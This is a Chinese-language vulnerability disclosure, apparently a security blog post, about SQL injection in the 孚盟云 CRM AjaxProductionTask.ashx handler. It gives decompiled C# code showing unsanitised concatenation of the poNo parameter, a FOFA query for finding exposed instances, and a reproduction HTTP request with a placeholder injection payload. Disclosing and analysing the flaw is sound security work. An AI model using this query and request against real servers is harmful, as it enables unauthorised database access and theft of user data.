---
title: "孚盟云CRM AjaxProductionTask.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProductionTask-sqli.html
asset_dir: assets/孚盟云crm-ajaxproductiontask.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxProductionTask.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/24 08:31
- 242浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

Windows安全工具

安全认证考试

文本剥离工具

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxProductionTask.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

深入探索

SQL注入检测工具

文件大小转换

服务器安全服务

直接看 `AjaxProductionTask.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxProductionTask** 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string empID = string.Empty;
  if (UserCookie.GetCookieValue("empId") != null)
    empID = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(UserCookie.GetCookieValue("empId"));
  try
  {
    string str = context.Request["method"].ToString();
    if (!string.op_Equality(str, "getProductionVaule"))
    {
      if (!string.op_Equality(str, "saveProductionVaule"))
      {
        if (!string.op_Equality(str, "getProductionList"))
          return;
        this.getProductionList(context, empID);
      }
      else
        this.saveProductionVaule(context, empID);
    }
    else
      this.getProductionVaule(context, empID);
  }
```

当**method=getProductionVaule**时，进入`getProductionVaule`方法

```
private void getProductionVaule(HttpContext context, string empID)
{
  string str1 = "";
  string str2 = context.Request["poNo"] == null ? "" : context.Request["poNo"].ToString();
  if (!string.IsNullOrEmpty(UserCookie.GetCookieValue("empId")))
  {
    empID = UserCookie.GetCookieValue("empId");
    empID = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(empID);
    if (!string.IsNullOrEmpty(str2))
    {
      string SQLString = $"SELECT TOP 1 A.FID,A.FactDate,A.Remark,B.gwmc, CASE WHEN EXISTS(SELECT TOP 1 1 FROM FM_TB27 P(nolock) JOIN syRoleDtl R(nolock) ON P.Rolemst = R.MstID WHERE P.MFID = B.FID AND R.EmpID = '{empID}') THEN '1' ELSE '0' END SaveRight from poModalTrack A (nolock) JOIN FM_TB26 B (nolock)ON A.ModalDtlFID = B.FID where A.PoNo = '{str2}' AND A.FactDate IS NULL ORDER BY B.OrderNo";
      DataSet dataSet = new DbHelperSql(UserCookie.GetCookieValue("corpId")).Query(SQLString);
```

参数**poNo**被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

**getProductionList**与**saveProductionVaule**存在同样的直接拼接导致的SQL注入漏洞。

代码安全审计

[![孚盟云CRM AjaxProductionTask.ashx SQL注入漏洞](images/img-001-14ac7c6aae3b.webp)](https://image.mrxn.net/62082b208c964400b70f587956025f80.webp)

[![孚盟云CRM AjaxProductionTask.ashx SQL注入漏洞](images/img-002-3317aef80e6f.webp)](https://image.mrxn.net/f456c106e2a94b3ab848eeca3d32702e.webp)

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxProductionTask.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1","corpId": "1"}
Content-Type: application/x-www-form-urlencoded

method=getProductionList&poNo='SQLI_POC--
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
